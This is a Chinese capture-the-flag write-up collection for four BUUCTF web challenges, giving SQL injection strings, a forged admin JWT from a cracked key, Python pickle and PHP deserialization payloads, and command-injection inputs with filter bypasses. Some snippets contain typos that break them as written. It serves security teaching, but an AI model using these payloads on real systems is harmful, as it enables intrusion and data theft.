# WEB方向解题思路

1. 看
2. 点
3. 试
4. 解

# [极客大挑战 2019] EasySQL

BUUCTF: https://buuoj.cn/challenges



## 解题方式1

### 先用万能密码

```mysql
' or 1=1 #
```

## 解题方式2

### 猜测字段数

```
' union select 1,2,3 #
```

## 解题方式3

### 基于`floor`报错注入

```
1' union select 1,count(*),concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x #
```

1.库名

2.表名

3.字段名

4.查结果

## 解题方式4：

### 基于`updatexml`报错注入

```
#查表名
' or updatexml(1,concat('~',(select table_name from information_schema.tables where table schema=database())),1) #
```

```
#查字段名
' or updatexm1(1,concat('~',(select group_concat(column_name) from information_schema.columns where table name="geekuser")),1) #
```



```
' or updatexm1(1,concat('~',(select password from geekuser limit 0,1)),1) #

# username : in_fact
# password: This_question_is_very_simple
```

### 小技巧

```mysql
like'%flag%

' or updatexml(1,payload,1)
payload = select password from geekuser where password like '%flag%
```

# [2019 CISCN]华北赛区 Day1 Web2

考点: Python、支付逻辑漏洞、Cookie篡改、重放攻击、JWT破解、垂直越权、代码审计、Python反序列化漏洞

## 使用Python去找lv6

```
# -*- coding: utf-8 -*-

def get_lv6():
	import requests
	for i in range(400) :
		url ='http://0ab1987d-baea-4dea-a200-3b1771b87ff4.node4.buuoj.cn:81/shop?page={}'.format(i)
		resp = requests.get(ur1)
		if 'lv6.png' in resp.content.decode( 'utf-8'):
		print(i)
		break
	
if __name__=='__main__':
	get_lv6()
```

lv6在181页

http://0ab1987d-baea-4dea-a200-3b1771b87ff4.node4.buuoj.cn:81/shop?page=181

## 注册登录

```
账号：qwerty
邮箱：qwerty@123.com
密码：qwerty
```

## 在网页更改优惠券

优惠券:-20.0%

```
<form action="" method="post">
<input type="hidden" name="_xsrf" value="2|8dfe5a53|344c42fa8eb31096ba497b29580ae08c|1693473046">
<input type="hidden" name="id" value="1624">
<input type="hidden" name="price" value="1145141919.0">
<input type="hidden" name="discount" value="0.8">
<button class="btn btn-danger" type="submit">结算</button>
</form>
```

0.8-->0.00000008

购买成功后，显示只允许admin查看

## cookie带了JWT

```
_xsrf=2|a5334d1c|1c8155b5a67e07d992846c6670c7f7c3|1693473046; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF3ZXJ0eSJ9.FbjCsNp1kM-NvtKYKMcDZAcifvO6EojCYhnps1XD6FU; commodity_id="2|1:0|10:1693473749|12:commodity_id|8:MTYyNA==|fae4edddc5a432b04dcaf8f0f0481740a13b4e969cd618ed23018774290cff21"
```

```
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF3ZXJ0eSJ9.FbjCsNp1kM-NvtKYKMcDZAcifvO6EojCYhnps1XD6FU
```

https://jwt.io

进行base64解码

![image-20230831172930716](https://s2.loli.net/2023/08/31/4giOrFpuQ9CjPlt.png)

```
{
  "username": "qwerty"
}
```

pyload存在用户名



## 替换cookie

破解jwt key

将username的值改为admin,编译后再替换cookie

### c-jwt-cracker

github地址：https://github.com/brendan-rius/c-jwt-cracker

```
jwtcrack crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF3ZXJ0eSJ9.FbjCsNp1kM-NvtKYKMcDZAcifvO6EojCYhnps1XD6FU
```

## jwt key

```
INFO:[*]: GET IT! JWT Signature Secret: 1Kun
```

key的值是：`1Kun`

## 替换cookie

得到篡改admin的JWT的值为

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

![image-20230831175144795](https://s2.loli.net/2023/08/31/AHQ7i6uXpJTSYCh.png)

## BurpsuitE抓包改cookie的jwt值

![image-20230831183007756](https://s2.loli.net/2023/08/31/dXACxu4U73Bmsew.png)

点击"一键成为大会员"没有反应，

查看源代码有一个www.zip

```
<a href="/static/asd1f654e683wq/www.zip"><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>
```



http://64e1263c-61b5-4b8f-9206-077ee4d322ee.node4.buuoj.cn:81/static/asd1f654e683wq/www.zip

## 分析源代码

![image-20230831184224692](https://s2.loli.net/2023/08/31/lPgqpJs5nCbfMGK.png)

```
import tornado.web
import tornado.ioloop
import tornado.httpserver
import tornado.options
from tornado.options import options, define

define('port', default=8233, help='run on the given port', type=int)
define('address', default='0.0.0.0', help='binding at given address', type=str)

from sshop import Application

def main():
    tornado.options.parse_command_line()
    server = tornado.httpserver.HTTPServer(Application())
    server.listen(options.port, options.address)
    print('slog server started: <http://%s:%s>' % (options.address, options.port))
    tornado.ioloop.IOLoop.instance().start()


if __name__ == '__main__':
    main()
```

通过分析得知，框架为tornado，Python版本为2.7.x

通过代码审计，得知，这里有个hint

![image-20230831184550320](https://s2.loli.net/2023/08/31/KpGe1MrV9LEJmoY.png)

```
\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc
```

### 进行unicode编码

![image-20230831184748378](https://s2.loli.net/2023/08/31/f79oeE3WKQbm2Cr.png)

**这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里**



前端代码

![image-20230831185132028](https://s2.loli.net/2023/08/31/6km1WfwRx7vg4sD.png)

通过源码分析一键成为大会员的源码是

![image-20230831185026154](https://s2.loli.net/2023/08/31/ajcAhGigq152sRw.png)

### 把hidden去掉

在前端删除`hidden="hidden"`

![image-20230831185544513](https://s2.loli.net/2023/08/31/egidb7saBcfA34o.png)

## 构建pythonPayload

```
import pickle
import urllib
import os
class Payload(object):
	def __reduce__(self):
		return(os.listdir,('/'))

if __name__ =='__main__':
	tmp = pickle.dumps(Payload())
	print(urllib.quote(tmp))
```

## 进行python反序列化

```
cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.
```

![image-20230831190643739](https://s2.loli.net/2023/08/31/rMRgH8BChX4NlIO.png)

```
['bin', 'dev', 'etc', 'home', 'lib', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp', 'usr', 'var', 'flag.txt', 'app', '.dockerenv']
```

发现根目录下有一个flag.txt

## 查看flag.txt

```
import pickle
import urllib
import os
class Payload(object):
	def __reduce__(self):
		return (eval.("open('/flag.txt','r').read()"))

if __name__ =='__main__':
	tmp = pickle.dumps(Payload())
	print(urllib.quote(tmp))
```

### 反序列化

```
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

## flag

```
flag{32acd1e8-8107-4c7c-928e-86faf25c49c1}
```

# [网鼎杯2020 青龙组]AreUSerialz

考点：PHP反序列化



```
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

对于**反序列化**的题一定要有源码

## 读题干，读源码

通过分析得知，

如果 op=1调用write() 

如果 op=2调用read()

## 思路:

1。通过代码审计得知，unserialize (str) 这个变量，当我们构建序列化赋值给str时候，会自动触发__destruct这个方法

2.会调用process 这个方法，然后process 如只有op = 2的时候才满足我们的需求

3.我们要调用读取方法，读的是filename，所以filenam的值应该是flag.php，我们要把这个filename覆盖掉

## 编写php代码

http://dooccn.com/php

```
<?php
class FileHandler {
	public $op ='2';
	public $filename ='flag.php'
	public $content ='';
}
$a = new FileHandler();
echo serialize($a);
?>
```

## php序列化

```
O:11:"FileHandler":3:{s:2:"op";s:2:"2";s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

传入参数str

```
?str=O:11:"FileHandler":3:{s:2:"op";s:2:" 2";s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

页面出现`[Result]:`,右键查看源代码得到flag.txt

```
<?php $flag='flag{07badb8b-e8f3-4b4e-b5fa-ba082d9f48b1}';
```

## flag

```
flag{07badb8b-e8f3-4b4e-b5fa-ba082d9f48b1}
```

# [GXYCTF 2019]Ping Ping Ping

打开后显示`/?ip=`

```
/?ip=127.0.0.1
```

PING 127.0.0.1 (127.0.0.1): 56 data bytes

```
/?ip=127.0.0.1;ls
```

PING 127.0.0.1 (127.0.0.1): 56 data bytes

flag.php

index.php

## 尝试读取flag.php

```
/?ip=127.0.0.1;;echo flag.php
```

/?ip= fxck your space!

过滤了空格

## 绕过空格

需要空格绕过的解决方案 `$IFS`

```
$IFS
${IFS}
$IFS$9
```



```
/?ip=127.0.0.1;cat$IFSflag.php
```

/?ip= fxck your flag!

flag也被过滤了

## 读取index.php

```
/?ip=127.0.0.1;cat$IFS$9index.php
```

得到index.php源码，过滤规则

```
/?ip=
PING 127.0.0.1 (127.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

## 绕过flag过滤

使用参数

a=g;

fla$a.php

```
/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php
```



右键查看源代码

```
/?ip=
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
<?php
$flag = "flag{77249ee7-7da8-4637-8cc0-c27cfb95a139}";
?>
```

## flag

```
flag{77249ee7-7da8-4637-8cc0-c27cfb95a139}
```

